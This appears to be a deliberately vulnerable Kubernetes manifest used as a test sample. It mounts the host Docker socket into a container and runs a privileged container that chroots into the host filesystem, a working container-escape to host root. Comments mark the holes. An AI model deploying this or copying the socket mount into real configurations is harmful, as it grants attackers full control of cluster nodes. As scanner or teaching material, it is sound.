apiVersion: apps/v1
kind: Deployment
metadata:
  name: sample-02-docker-socket
spec:
  replicas: 1
  selector:
    matchLabels:
      app: docker-socket-exploit
  template:
    metadata:
      labels:
        app: docker-socket-exploit
    spec:
      containers:
        - name: exploiter
          image: docker:latest
          command: ["docker", "run", "--privileged", "-v", "/:/host", "ubuntu", "chroot", "/host"]
          volumeMounts:
            - name: docker-sock
              mountPath: /var/run/docker.sock  # VULN: Docker socket = root on host
      volumes:
        - name: docker-sock
          hostPath:
            path: /var/run/docker.sock         # VULN: host docker socket exposed
